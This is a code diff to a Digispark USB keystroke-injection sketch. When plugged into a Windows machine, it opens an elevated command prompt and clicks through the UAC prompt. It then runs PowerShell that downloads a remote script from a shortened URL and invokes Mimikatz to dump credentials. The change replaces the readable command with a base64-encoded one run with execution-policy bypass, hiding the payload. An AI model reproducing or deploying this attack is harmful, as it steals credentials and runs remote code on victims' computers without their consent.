@@ -5,16 +5,16 @@
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(250);
-    DigiKeyboard.write(PSTR(" powershell Start-Process cmd.exe -Verb runAs"));
+    DigiKeyboard.write(" powershell Start-Process cmd.exe -Verb runAs");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(2500);
     DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
     DigiKeyboard.delay(2000);
-    DigiKeyboard.write(PSTR(" powershell \@IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds\@; pause"));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.write(" powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AaQBzAC4AZwBkAC8AbwBlAG8ARgB1AEkAJwApADsAIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgAHAAYQB1AHMAZQA=");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
   }
-  
-  
+    
   void loop() {
     digitalWrite(0,HIGH);
     digitalWrite(1,HIGH);
